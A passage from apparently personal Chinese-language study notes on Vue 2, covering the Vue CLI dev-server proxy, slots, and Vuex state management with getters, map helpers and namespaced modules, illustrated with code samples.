&lt;/script&gt;

&lt;style scoped&gt;
    h1&#123;
        background-color: orange;
    &#125;
&lt;/style&gt;
</code></pre>
<h2 id="2-9-vue脚手架配置代理"><a href="#2-9-vue脚手架配置代理" class="headerlink" title="2.9 vue脚手架配置代理"></a>2.9 vue脚手架配置代理</h2><p>Vue cli中的代理服務器配置可以用来解决跨域的问题<br><img src="image-20230406192554427.png" style="zoom:80%;border: 5px solid orange;" /></p>
<blockquote>
<p>ajax 是前端技术，你得有浏览器，才有window对象，才有xhr，才能发ajax请求，使用代理服務器為服務器之間的通信，用传统的http请求就行了，所以沒有跨域問題。</p>
</blockquote>
<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>​    在vue.config.js中添加如下配置：</p>
<pre><code class="js">devServer:&#123;
  proxy:&quot;http://localhost:5000&quot; //要請求的伺服器位置，不需port之後的路徑
&#125;
</code></pre>
<p>说明：</p>
<ol>
<li>优点：配置简单，请求资源时直接发给前端（8080）即可。</li>
<li>缺点：不能配置多个代理，不能灵活的控制请求是否走代理。</li>
<li>工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）</li>
</ol>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>​    编写vue.config.js配置具体代理规则：</p>
<pre><code class="js">module.exports = &#123;
    devServer: &#123;
      proxy: &#123;
      &#39;/api1&#39;: &#123;// 若請求前綴為/api1開頭，則強制使用代理伺服器發送請求
        target: &#39;http://localhost:5000&#39;,// 發送目標伺服器的基础路径
        pathRewrite: &#123;&#39;^/api1&#39;: &#39;&#39;&#125;//代理服务器将请求地址转给真实服务器时会将 /api1 去掉 &#123;正則表達式 若匹配以/api1開頭替換為空字符串&#125;
        //ws: true, //用於支持websocket，不寫默認為true
        //changeOrigin: true //用於控制請求頭中的host值，不寫默認為true，會撒謊將host改為與請求目標伺服器一致
      &#125;,
      &#39;/api2&#39;: &#123;// 若請求前綴為/api2開頭，則強制使用代理伺服器發送請求
        target: &#39;http://localhost:5001&#39;,// 發送目標伺服器的基础路径
        pathRewrite: &#123;&#39;^/api2&#39;: &#39;&#39;&#125;,
        //ws: true, //用於支持websocket，不寫默認為true
        //changeOrigin: true //用於控制請求頭中的host值，不寫默認為true，會撒謊將host改為與請求目標伺服器一致          
      &#125;
    &#125;
  &#125;
&#125;
/*
   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
   changeOrigin默认值为true
*/
</code></pre>
<p>说明：</p>
<ol>
<li>优点：可以配置多个代理，且可以灵活的控制请求是否走代理。</li>
<li>缺点：配置略微繁琐，请求资源时必须加前缀。</li>
</ol>
<blockquote>
<p>複習ES6<code>模板字符串</code>知識：可參考<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals">模板字符串 - JavaScript | MDN (mozilla.org)</a></p>
<p><strong>模板字面量</strong>是用反引号（```）分隔的字面量，允许<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%A4%9A%E8%A1%8C%E5%AD%97%E7%AC%A6%E4%B8%B2">多行字符串</a>、带嵌入表达式的<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8F%92%E5%80%BC">字符串插值</a>和一种叫<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%B8%A6%E6%A0%87%E7%AD%BE%E7%9A%84%E6%A8%A1%E6%9D%BF">带标签的模板</a>的特殊结构。</p>
<p>模板字面量有时被非正式地叫作<em>模板字符串</em>，因为它们最常被用作<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8F%92%E5%80%BC">字符串插值</a>（通过替换占位符来创建字符串）。然而，带标签的模板字面量可能不会产生字符串——它可以与自定义<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%B8%A6%E6%A0%87%E7%AD%BE%E7%9A%84%E6%A8%A1%E6%9D%BF">标签函数</a>一起使用，来对模板字面量的不同部分执行任何操作。</p>
<pre><code class="vue">`string text`

`string text line 1
string text line 2`

`string text $&#123;expression&#125; string text`

tagFunction`string text $&#123;expression&#125; string text`
</code></pre>
</blockquote>
<h2 id="2-10-slot插槽"><a href="#2-10-slot插槽" class="headerlink" title="2.10 slot插槽"></a>2.10 slot插槽</h2><ol>
<li><p>作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 ===&gt; 子组件</strong></p>
</li>
<li><p>分类：默认插槽、具名插槽、作用域插槽</p>
</li>
<li><p>使用方式：</p>
<ol>
<li><p>默认插槽：</p>
<pre><code class="html">父组件中：
        &lt;Category&gt;
           &lt;div&gt;html结构1&lt;/div&gt;
        &lt;/Category&gt;
子组件中：
        &lt;template&gt;
            &lt;div&gt;
               &lt;!-- 定义插槽 --&gt;
               &lt;slot&gt;插槽默认内容...&lt;/slot&gt;
            &lt;/div&gt;
        &lt;/template&gt;
</code></pre>
</li>
<li><p>具名插槽：</p>
<pre><code class="html">父组件中：
        &lt;Category&gt;
            &lt;template slot=&quot;center&quot;&gt;
              &lt;div&gt;html结构1&lt;/div&gt;
            &lt;/template&gt;

            &lt;template v-slot:footer&gt;
               &lt;div&gt;html结构2&lt;/div&gt;
            &lt;/template&gt;
        &lt;/Category&gt;
子组件中：
        &lt;template&gt;
            &lt;div&gt;
               &lt;!-- 定义插槽 --&gt;
               &lt;slot name=&quot;center&quot;&gt;插槽默认内容...&lt;/slot&gt;
               &lt;slot name=&quot;footer&quot;&gt;插槽默认内容...&lt;/slot&gt;
            &lt;/div&gt;
        &lt;/template&gt;
</code></pre>
</li>
<li><p>作用域插槽：</p>
<ol>
<li><p>理解：<span style="color:red">数据在组件的自身（子组件），但根据数据生成的结构需要组件的使用者（父组件）来决定。</span>（games数据在Category（子）组件中，但使用数据所遍历出来的结构由App（父）组件决定）</p>
</li>
<li><p>具体编码：</p>
<pre><code class="html">父组件中：
        &lt;Category&gt;
            &lt;template scope=&quot;scopeData&quot;&gt;
                &lt;!-- 生成的是ul列表 --&gt;
                &lt;ul&gt;
                    &lt;li v-for=&quot;g in scopeData.games&quot; :key=&quot;g&quot;&gt;&#123;&#123;g&#125;&#125;&lt;/li&gt;
                &lt;/ul&gt;
            &lt;/template&gt;
        &lt;/Category&gt;

        &lt;Category&gt;
            &lt;template slot-scope=&quot;scopeData&quot;&gt;
                &lt;!-- 生成的是h4标题 --&gt;
                &lt;h4 v-for=&quot;g in scopeData.games&quot; :key=&quot;g&quot;&gt;&#123;&#123;g&#125;&#125;&lt;/h4&gt;
            &lt;/template&gt;
        &lt;/Category&gt;
子组件中：
        &lt;template&gt;
            &lt;div&gt;
            &lt;!-- 通过数据绑定就可以把子组件的数据传到父组件 --&gt;
                &lt;slot :games=&quot;games&quot;&gt;&lt;/slot&gt;
            &lt;/div&gt;
        &lt;/template&gt;

        &lt;script&gt;
            export default &#123;
                name:&#39;Category&#39;,
                props:[&#39;title&#39;],
                //数据在子组件自身
                data() &#123;
                    return &#123;
                        games:[&#39;红色警戒&#39;,&#39;穿越火线&#39;,&#39;劲舞团&#39;,&#39;超级玛丽&#39;]
                    &#125;
                &#125;,
            &#125;
        &lt;/script&gt;
</code></pre>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<h1 id="3-VUEX"><a href="#3-VUEX" class="headerlink" title="3. VUEX"></a>3. VUEX</h1><h2 id="3-1-概念"><a href="#3-1-概念" class="headerlink" title="3.1 概念"></a>3.1 概念</h2><p>​        在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。</p>
<blockquote>
<p>如下圖，若使用全局事件總線來實現數據共享，很麻煩</p>
</blockquote>
<p><img src="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/image-20230411105928919.png" alt="image-20230411105928919"></p>
<blockquote>
<p>使用Vuex插件來實現數據共享</p>
</blockquote>
<p><img src="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/image-20230411110153850.png" alt="image-20230411110153850"></p>
<h2 id="3-2-何时使用？"><a href="#3-2-何时使用？" class="headerlink" title="3.2 何时使用？"></a>3.2 何时使用？</h2><p>​        多个组件需要共享数据时</p>
<h2 id="3-3-Vuex工作原理图"><a href="#3-3-Vuex工作原理图" class="headerlink" title="3.3 Vuex工作原理图"></a>3.3 Vuex工作原理图</h2><img src="image-20230406192602962.png" style="zoom:80%;border: 5px solid orange;" />



<h2 id="3-4-搭建vuex环境"><a href="#3-4-搭建vuex环境" class="headerlink" title="3.4 搭建vuex环境"></a>3.4 搭建vuex环境</h2><h3 id="3-4-1-安裝Vuex"><a href="#3-4-1-安裝Vuex" class="headerlink" title="3.4.1 安裝Vuex"></a>3.4.1 安裝Vuex</h3><p>直接執行<code>npm i vuex</code>會安裝最新版本的Vuex，若要安裝Vuex的3版本，須執行<code>npm i vuex@3</code></p>
<blockquote>
<p>Vue2中，要用Vuex的3版本</p>
<p>Vue3中，要用Vuex的4版本</p>
</blockquote>
<h3 id="3-4-2-引入Vuex、配置store"><a href="#3-4-2-引入Vuex、配置store" class="headerlink" title="3.4.2 引入Vuex、配置store"></a>3.4.2 引入Vuex、配置store</h3><ol>
<li><p>创建文件：<code>src/store/index.js</code></p>
<pre><code class="js">//引入Vue核心库
import Vue from &#39;vue&#39;
//引入Vuex
import Vuex from &#39;vuex&#39;
//应用Vuex插件
Vue.use(Vuex)

//准备actions对象——响应组件中用户的动作
const actions = &#123;&#125;
//准备mutations对象——修改state中的数据
const mutations = &#123;&#125;
//准备state对象——保存具体的数据
const state = &#123;&#125;

/*
//創建store
const store = new Vuex.Store(&#123;
    actions,
    mutations,
    state,
&#125;)

//暴露store
export default store
*/ 

//创建并暴露store (簡寫上方兩個代碼)
export default new Vuex.Store(&#123;
    actions,
    mutations,
    state
&#125;)
</code></pre>
<p><img src="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/image-20230411145815136.png" alt="image-20230411145815136"></p>
<blockquote>
<ul>
<li><p>Vue.use(Vuex)需在store創建實例對象之前使用，否則報錯</p>
</li>
<li><p>因Vue cli執行js的順序會先將全部的import先執行，才執行內部代碼，而import store時store的實例對象已經創建，所以在main.js中改變Vue.use(Vuex)和import store 的順序沒有用，須將Vue.use(Vuex)移到import store的js文件內部使用，使用前先引入vue</p>
</li>
</ul>
</blockquote>
</li>
</ol>
<ol start="2">
<li><p>引入Vuex後，即可以在<code>main.js</code>中创建vm时传入<code>store</code>配置项 (不引入時配置store配置項vue不會反應)</p>
<pre><code class="js">//引入vue
import Vue from &#39;vue&#39;
//引入app
import app from &#39;./App.vue&#39;
//引入store
import store from &#39;./store&#39; //沒寫完整./store/index.js ，默認抓取index.js文件
//關閉Vue的生產提示
Vue.config.productionTip = false

//创建vm
new Vue(&#123;
    el:&#39;#app&#39;,
    render: h =&gt; h(App),
    store,
    beforeCreate()&#123;
        Vue.prototype.$bus = this
    &#125;
&#125;)
</code></pre>
</li>
</ol>
<h2 id="3-5-基本使用"><a href="#3-5-基本使用" class="headerlink" title="3.5 基本使用"></a>3.5 基本使用</h2><ol>
<li><p>初始化数据、配置<code>actions</code>、配置<code>mutations</code>，操作文件<code>store.js</code></p>
<pre><code class="js">//引入Vue核心库
import Vue from &#39;vue&#39;
//引入Vuex
import Vuex from &#39;vuex&#39;
//引用Vuex
Vue.use(Vuex)


const actions = &#123;
    //响应组件中加的动作
    jia(context,value)&#123;
        // console.log(&#39;actions中的jia被调用了&#39;,miniStore,value)
        context.commit(&#39;JIA&#39;,value)
    &#125;,
&#125;

const mutations = &#123;
    //执行加
    JIA(state,value)&#123;
        // console.log(&#39;mutations中的JIA被调用了&#39;,state,value)
        state.sum += value
    &#125;
&#125;

//初始化数据
const state = &#123;
   sum:0
&#125;

//创建并暴露store 
export default new Vuex.Store(&#123;
    actions,
    mutations,
    state,
&#125;)
</code></pre>
<blockquote>
<p>一般情況，actions裡面的函數使用小寫，mutations裡面的函數使用大寫，以利區分</p>
</blockquote>
</li>
<li><p>组件中读取vuex中的数据：<code>$store.state.sum</code></p>
</li>
<li><p>组件中修改vuex中的数据：<code>$store.dispatch(&#39;action中的方法名&#39;,数据)</code>或 <code>$store.commit(&#39;mutations中的方法名&#39;,数据)</code></p>
<blockquote>
<p> 备注：若没有网络请求或其他业务逻辑，组件中也可以越过actions，即不写<code>dispatch</code>，直接编写<code>commit</code></p>
</blockquote>
</li>
</ol>
<p>具体案例：</p>
<p>index.js</p>
<pre><code class="js">//该文件用于创建Vuex中最为核心的store
import Vue from &#39;vue&#39;
//引入Vuex
import Vuex from &#39;vuex&#39;
//应用Vuex插件
Vue.use(Vuex)

//准备actions——用于响应组件中的动作
const actions = &#123;
    /* 若函數沒有使用業務邏輯，可直接使用commit與mutations溝通
     jia(context,value)&#123;
        console.log(&#39;actions中的jia被调用了&#39;)
        context.commit(&#39;JIA&#39;,value)
    &#125;,
    jian(context,value)&#123;
        console.log(&#39;actions中的jian被调用了&#39;)
        context.commit(&#39;JIAN&#39;,value)
    &#125;, */
    jiaOdd(context,value)&#123;
        console.log(&#39;actions中的jiaOdd被调用了&#39;)
        if(context.state.sum % 2)&#123;
            context.commit(&#39;JIA&#39;,value)
        &#125;
    &#125;,
    jiaWait(context,value)&#123;
        console.log(&#39;actions中的jiaWait被调用了&#39;)
        setTimeout(()=&gt;&#123;
            context.commit(&#39;JIA&#39;,value)
        &#125;,500)
    &#125;
&#125;
//准备mutations——用于操作数据（state）
const mutations = &#123;
    JIA(state,value)&#123;
        console.log(&#39;mutations中的JIA被调用了&#39;)
        state.sum += value
    &#125;,
    JIAN(state,value)&#123;
        console.log(&#39;mutations中的JIAN被调用了&#39;)
        state.sum -= value
    &#125;
&#125;
//准备state——用于存储数据
const state = &#123;
    sum:0 //当前的和
&#125;

//创建并暴露store
export default new Vuex.Store(&#123;
    actions,
    mutations,
    state,
&#125;)
</code></pre>
<p>Count.vue</p>
<pre><code class="html">&lt;template&gt;
    &lt;div&gt;
        &lt;h1&gt;当前求和为：&#123;&#123;$store.state.sum&#125;&#125;&lt;/h1&gt;
        &lt;select v-model.number=&quot;n&quot;&gt;
            &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;
            &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt;
            &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;
        &lt;/select&gt;
        &lt;button @click=&quot;increment&quot;&gt;+&lt;/button&gt;
        &lt;button @click=&quot;decrement&quot;&gt;-&lt;/button&gt;
        &lt;button @click=&quot;incrementOdd&quot;&gt;当前求和为奇数再加&lt;/button&gt;
        &lt;button @click=&quot;incrementWait&quot;&gt;等一等再加&lt;/button&gt;
    &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
    export default &#123;
        name:&#39;Count&#39;,
        data() &#123;
            return &#123;
                n:1, //用户选择的数字
            &#125;
        &#125;,
        methods: &#123;
            increment()&#123;
                //this.$store.dispatch(&#39;jia&#39;,this.n) -&gt; actions中不須業務邏輯，可直接通過commit與mutations溝通
                // commit 是操作 mutations
                this.$store.commit(&#39;JIA&#39;,this.n)
            &#125;,
            decrement()&#123;
                //this.$store.dispatch(&#39;jian&#39;,this.n)-&gt; actions中不須業務邏輯，可直接通過commit與mutations溝通
                // commit 是操作 mutations
                this.$store.commit(&#39;JIAN&#39;,this.n)
            &#125;,
            incrementOdd()&#123;
                // dispatch 是操作 actions
                this.$store.dispatch(&#39;jiaOdd&#39;,this.n)
            &#125;,
            incrementWait()&#123;
                // dispatch 是操作 actions
                this.$store.dispatch(&#39;jiaWait&#39;,this.n)
            &#125;,
        &#125;,
        mounted() &#123;
            console.log(&#39;Count&#39;,this)
        &#125;,
    &#125;
&lt;/script&gt;

&lt;style lang=&quot;css&quot;&gt;
    button&#123;
        margin-left: 5px;
    &#125;
&lt;/style&gt;
</code></pre>
<h2 id="3-6-getters的使用"><a href="#3-6-getters的使用" class="headerlink" title="3.6 getters的使用"></a>3.6 getters的使用</h2><ol>
<li><p>概念：当state中的数据需要经过加工后再使用时，可以使用getters加工。</p>
</li>
<li><p>在<code>store.js</code>中追加<code>getters</code>配置</p>
<pre><code class="js">......

const getters = &#123;
    bigSum(state)&#123; //可由參數直接取得state內的值
        return state.sum * 10
    &#125;
&#125;

//创建并暴露store
export default new Vuex.Store(&#123;
    actions,
    mutations,
    state,
    getters
 &#125;)
</code></pre>
</li>
</ol>
<pre><code>
3. 组件中读取数据：```$store.getters.bigSum```



## 3.7 四个map方法的使用

导入

```js
import &#123;mapState, mapGetters, mapActions, mapMutations&#125; from &#39;vuex&#39;
</code></pre>
<ol>
<li><p><strong>mapState方法：</strong>用于帮助我们映射<code>state</code>中的数据为计算属性</p>
<pre><code class="js">computed: &#123;
    //借助mapState生成计算属性：sum、school、subject（对象写法）
     ...mapState(&#123;sum:&#39;sum&#39;,school:&#39;school&#39;,subject:&#39;subject&#39;&#125;),

    //借助mapState生成计算属性：sum、school、subject（数组写法）
    ...mapState([&#39;sum&#39;,&#39;school&#39;,&#39;subject&#39;]),
&#125;,
</code></pre>
<blockquote>
<p>mapxxxxx的值必須使用字符串’yyy’，才能到xxxxx下找讀取的名稱；若不使用’yyy’，會變成一個變量，找不到</p>
<p><code>...mapState(&#123;sum:&#39;sum&#39;,school:&#39;school&#39;,subject:&#39;subject&#39;&#125;),</code>，ES6語法，就是將mapState({sum:’sum’,school:’school’,subject:’subject’})返回的對象以鍵值對展開，即如下所示：</p>
<p>sum:function(){…},</p>
<p>school:function(){…}</p>
<p>subject:function(){…}</p>
<p>鍵值對sum:’sum’無法使用簡寫sum，只有當值為變量的時候才能使用簡寫形式</p>
<p>此處api提供數組寫法可以簡寫</p>
</blockquote>
</li>
</ol>
<ol start="2">
<li><p><strong>mapGetters方法：</strong>用于帮助我们映射<code>getters</code>中的数据为计算属性</p>
<pre><code class="js">computed: &#123;
    //借助mapGetters生成计算属性：bigSum（对象写法）
    ...mapGetters(&#123;bigSum:&#39;bigSum&#39;&#125;),

    //借助mapGetters生成计算属性：bigSum（数组写法）
    ...mapGetters([&#39;bigSum&#39;])
&#125;,
</code></pre>
</li>
</ol>
<ol start="3">
<li><p><strong>mapActions方法：</strong>用于帮助我们生成与<code>actions</code>对话的方法，即：包含<code>$store.dispatch(xxx)</code>的函数</p>
<pre><code class="js">methods:&#123;
    //靠mapActions生成：incrementOdd、incrementWait（对象形式）
    ...mapActions(&#123;incrementOdd:&#39;jiaOdd&#39;,incrementWait:&#39;jiaWait&#39;&#125;)

    //靠mapActions生成：incrementOdd、incrementWait（数组形式）
    ...mapActions([&#39;jiaOdd&#39;,&#39;jiaWait&#39;])
&#125;
</code></pre>
</li>
</ol>
<ol start="4">
<li><p><strong>mapMutations方法：</strong>用于帮助我们生成与<code>mutations</code>对话的方法，即：包含<code>$store.commit(xxx)</code>的函数</p>
<pre><code class="js">methods:&#123;
    //靠mapActions生成：increment、decrement（对象形式）
    ...mapMutations(&#123;increment:&#39;JIA&#39;,decrement:&#39;JIAN&#39;&#125;),

    //靠mapMutations生成：JIA、JIAN（对象形式）
    ...mapMutations([&#39;JIA&#39;,&#39;JIAN&#39;]), //用簡寫生成的方法名為JIA及JIAN，綁定單擊事件必須將方法名修改為JIA及JIAN
&#125;
</code></pre>
</li>
</ol>
<blockquote>
<p>备注：mapActions与mapMutations使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则传的参数是事件对象(event)。</p>
<p>說明：mapMutations幫我們生成的方法為<code>increment(value)&#123;this.$store.commit(&#39;JIA&#39;,value)&#125;</code>，而原本手動寫的方法傳到mutation的值為this.n，我們要把n值傳遞到方法要在綁定點擊事件中傳參，若不傳參默認為event，即當前點擊事件</p>
</blockquote>
<p>具体案例：</p>
<pre><code class="html">&lt;template&gt;
  &lt;div&gt;
    &lt;h1&gt;当前求和为：&#123;&#123; sum &#125;&#125;&lt;/h1&gt;
    &lt;h3&gt;当前求和放大10倍为：&#123;&#123; bigSum &#125;&#125;&lt;/h3&gt;
    &lt;h3&gt;年龄：&#123;&#123; age &#125;&#125;&lt;/h3&gt;
    &lt;h3&gt;姓名：&#123;&#123;name&#125;&#125;&lt;/h3&gt;
    &lt;select v-model.number=&quot;n&quot;&gt;
      &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;
      &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt;
      &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;
    &lt;/select&gt;
    &lt;!-- 用了mapActions 和 mapMutations 的话要主动传参 --&gt;
    &lt;button @click=&quot;increment(n)&quot;&gt;+&lt;/button&gt;
    &lt;button @click=&quot;decrement(n)&quot;&gt;-&lt;/button&gt;
    &lt;button @click=&quot;incrementOdd(n)&quot;&gt;当前求和为奇数再加&lt;/button&gt;
    &lt;button @click=&quot;incrementWait(n)&quot;&gt;等一等再加&lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
import &#123; mapState, mapGetters, mapActions, mapMutations &#125; from &#39;vuex&#39;
export default &#123;
  name: &quot;Count&quot;,
  data() &#123;
    return &#123;
      n: 1, //用户选择的数字
    &#125;;
  &#125;,
  computed: &#123;
    ...mapState([&#39;sum&#39;, &#39;age&#39;, &#39;name&#39;]),
    ...mapGetters([&#39;bigSum&#39;])  
  &#125;,
  methods: &#123;
    ...mapActions(&#123;incrementOdd: &#39;sumOdd&#39;, incrementWait: &#39;sumWait&#39;&#125;),
    ...mapMutations(&#123;increment: &#39;sum&#39;, decrement: &#39;reduce&#39;&#125;)
  &#125;,
  mounted() &#123;
    console.log(&quot;Count&quot;, this);
  &#125;,
&#125;;
&lt;/script&gt;

&lt;style lang=&quot;css&quot;&gt;
button &#123;
  margin-left: 5px;
&#125;
&lt;/style&gt;
</code></pre>
<h2 id="3-8-模块化-命名空间"><a href="#3-8-模块化-命名空间" class="headerlink" title="3.8 模块化+命名空间"></a>3.8 模块化+命名空间</h2><ol>
<li><p>目的：让代码更好维护，让多种数据分类更加明确。</p>
</li>
<li><p>修改<code>store.js</code></p>
<pre><code class="javascript">const countAbout = &#123;
  namespaced:true,//开启命名空间
  state:&#123;x:1&#125;,
  mutations: &#123; ... &#125;,
  actions: &#123; ... &#125;,
  getters: &#123;
    bigSum(state)&#123;
       return state.sum * 10
    &#125;
  &#125;
&#125;

const personAbout = &#123;
  namespaced:true,//开启命名空间
  state:&#123; ... &#125;,
  mutations: &#123; ... &#125;,
  actions: &#123; ... &#125;
&#125;

const store = new Vuex.Store(&#123;
  modules: &#123;
    countAbout,
    personAbout
  &#125;
&#125;)
</code></pre>
</li>
<li><p>开启命名空间后，组件中读取state数据：</p>
<pre><code class="js">//方式一：自己直接读取
this.$store.state.personAbout.list
//方式二：借助mapState读取：
// 用 mapState 取 countAbout 中的state 必须加上 &#39;countAbout&#39;
...mapState(&#39;countAbout&#39;,[&#39;sum&#39;,&#39;school&#39;,&#39;subject&#39;]),
</code></pre>
</li>
<li><p>开启命名空间后，组件中读取getters数据：</p>
<pre><code class="js">//方式一：自己直接读取
this.$store.getters[&#39;personAbout/firstPersonName&#39;]
//方式二：借助mapGetters读取：
...mapGetters(&#39;countAbout&#39;,[&#39;bigSum&#39;])
</code></pre>
</li>
<li><p>开启命名空间后，组件中调用dispatch</p>
<pre><code class="js">//方式一：自己直接dispatch
this.$store.dispatch(&#39;personAbout/addPersonWang&#39;,person)
//方式二：借助mapActions：
...mapActions(&#39;countAbout&#39;,&#123;incrementOdd:&#39;jiaOdd&#39;,incrementWait:&#39;jiaWait&#39;&#125;)
</code></pre>
</li>
<li><p>开启命名空间后，组件中调用commit</p>
<pre><code class="js">//方式一：自己直接commit
this.$store.commit(&#39;personAbout/ADD_PERSON&#39;,person)
//方式二：借助mapMutations：
...mapMutations(&#39;countAbout&#39;,&#123;increment:&#39;JIA&#39;,decrement:&#39;JIAN&#39;&#125;),
</code></pre>
</li>
</ol>
<p>具体案例：<br>count.js</p>
<pre><code class="js">//求和相关的配置
export default &#123;//暴露count.js
    namespaced:true,
    actions:&#123;
        jiaOdd(context,value)&#123;
            console.log(&#39;actions中的jiaOdd被调用了&#39;)
            if(context.state.sum % 2)&#123;
                context.commit(&#39;JIA&#39;,value)
            &#125;
        &#125;,
        jiaWait(context,value)&#123;
            console.log(&#39;actions中的jiaWait被调用了&#39;)
            setTimeout(()=&gt;&#123;
                context.commit(&#39;JIA&#39;,value)
            &#125;,500)
        &#125;
    &#125;,
    mutations:&#123;
        JIA(state,value)&#123;
            console.log(&#39;mutations中的JIA被调用了&#39;)
            state.sum += value
        &#125;,
        JIAN(state,value)&#123;
            console.log(&#39;mutations中的JIAN被调用了&#39;)
            state.sum -= value
        &#125;,
    &#125;,
    state:&#123;
        sum:0, //当前的和
        school:&#39;尚硅谷&#39;,
        subject:&#39;前端&#39;,
    &#125;,
    getters:&#123;
        bigSum(state)&#123;
            return state.sum*10
        &#125;
    &#125;,
&#125;
</code></pre>
<p>person.js</p>
<pre><code class="js">//人员管理相关的配置
import axios from &#39;axios&#39;
import &#123; nanoid &#125; from &#39;nanoid&#39;
export default &#123; //暴露person.js
    namespaced:true,
    actions:&#123;
        addPersonWang(context,value)&#123;
            if(value.name.indexOf(&#39;王&#39;) === 0)&#123; //判斷添加的第0個字是否為王
                context.commit(&#39;ADD_PERSON&#39;,value)
            &#125;else&#123;
                alert(&#39;添加的人必须姓王！&#39;)
            &#125;
        &#125;,
        //模擬發送請求由後端取得數據
        addPersonServer(context)&#123;
            axios.get(&#39;https://api.uixsj.cn/hitokoto/get?type=social&#39;).then(
                response =&gt; &#123;
                    context.commit(&#39;ADD_PERSON&#39;,&#123;id:nanoid(),name:response.data&#125;)
                &#125;,
                error =&gt; &#123;
                    alert(error.message)
                &#125;
            )
        &#125;
    &#125;,
    mutations:&#123;
        ADD_PERSON(state,value)&#123;
            console.log(&#39;mutations中的ADD_PERSON被调用了&#39;)
            state.personList.unshift(value)
        &#125;
    &#125;,
    state:&#123;
        personList:[
            &#123;id:&#39;001&#39;,name:&#39;张三&#39;&#125;
        ]
    &#125;,
    getters:&#123;
        firstPersonName(state)&#123;
            return state.personList[0].name
        &#125;
    &#125;,
&#125;
</code></pre>
<p>index.js</p>
<pre><code class="js">//该文件用于创建Vuex中最为核心的store
import Vue from &#39;vue&#39;
//引入Vuex
import Vuex from &#39;vuex&#39;
//引入count.js
import countOptions from &#39;./count&#39;
//引入person.js
import personOptions from &#39;./person&#39;
//应用Vuex插件
Vue.use(Vuex)

/* 將countOptions另外保存到count.js文件中，然後引用到index.js
const countOptions &#123;
    namespaced:true,
    actions:&#123;
        jiaOdd(context,value)&#123;
            console.log(&#39;actions中的jiaOdd被调用了&#39;)
            if(context.state.sum % 2)&#123;
                context.commit(&#39;JIA&#39;,value)
            &#125;
        &#125;,
        jiaWait(context,value)&#123;
            console.log(&#39;actions中的jiaWait被调用了&#39;)
            setTimeout(()=&gt;&#123;
                context.commit(&#39;JIA&#39;,value)
            &#125;,500)
        &#125;
    &#125;,
    mutations:&#123;
        JIA(state,value)&#123;
            console.log(&#39;mutations中的JIA被调用了&#39;)
            state.sum += value
        &#125;,
        JIAN(state,value)&#123;
            console.log(&#39;mutations中的JIAN被调用了&#39;)
            state.sum -= value
        &#125;,
    &#125;,
    state:&#123;
        sum:0, //当前的和
        school:&#39;尚硅谷&#39;,
        subject:&#39;前端&#39;,
    &#125;,
    getters:&#123;
        bigSum(state)&#123;
            return state.sum*10
        &#125;
    &#125;,
&#125;
*/

/*將personOptions另外保存到person.js文件中，然後引用到index.js
const personOptions &#123; 
    namespaced:true,
    actions:&#123;
        addPersonWang(context,value)&#123;
            if(value.name.indexOf(&#39;王&#39;) === 0)&#123; //判斷添加的第0個字是否為王
                context.commit(&#39;ADD_PERSON&#39;,value)
            &#125;else&#123;
                alert(&#39;添加的人必须姓王！&#39;)
            &#125;
        &#125;,
        addPersonServer(context)&#123;
            axios.get(&#39;https://api.uixsj.cn/hitokoto/get?type=social&#39;).then(
                response =&gt; &#123;
                    context.commit(&#39;ADD_PERSON&#39;,&#123;id:nanoid(),name:response.data&#125;)
                &#125;,
                error =&gt; &#123;
                    alert(error.message)
                &#125;
            )
        &#125;
    &#125;,
    mutations:&#123;
        ADD_PERSON(state,value)&#123;
            console.log(&#39;mutations中的ADD_PERSON被调用了&#39;)
            state.personList.unshift(value)
        &#125;
    &#125;,
    state:&#123;
        personList:[
            &#123;id:&#39;001&#39;,name:&#39;张三&#39;&#125;
        ]
    &#125;,
    getters:&#123;
        firstPersonName(state)&#123;
            return state.personList[0].name
        &#125;
    &#125;,
&#125;
*/

//创建并暴露store
export default new Vuex.Store(&#123;
    modules:&#123;
        countAbout:countOptions,
        personAbout:personOptions
    &#125;
&#125;)
</code></pre>
<p>count.vue</p>
<pre><code class="html">&lt;template&gt;
    &lt;div&gt;
        &lt;h1&gt;当前求和为：&#123;&#123;sum&#125;&#125;&lt;/h1&gt;
        &lt;h3&gt;当前求和放大10倍为：&#123;&#123;bigSum&#125;&#125;&lt;/h3&gt;
        &lt;h3&gt;我在&#123;&#123;school&#125;&#125;，学习&#123;&#123;subject&#125;&#125;&lt;/h3&gt;
